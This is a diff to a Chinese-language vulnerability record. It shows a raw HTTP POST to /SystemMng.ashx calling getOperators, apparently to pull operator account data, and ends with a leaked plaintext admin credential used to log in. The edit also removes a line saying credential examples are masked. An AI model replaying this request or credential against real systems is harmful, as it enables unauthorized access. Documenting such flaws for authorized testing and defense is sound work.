@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -62,6 +62,7 @@ schema_version: "1"
 POST /SystemMng.ashx HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Content-Length: 91
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
@@ -72,7 +73,7 @@ X-Requested-With: XMLHttpRequest
 page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators
 ```
 
-> 请求长度说明：原资料 Content-Length 为 91；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 91；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 使用泄露的账号密码登录系统`admin/LSFace2023`
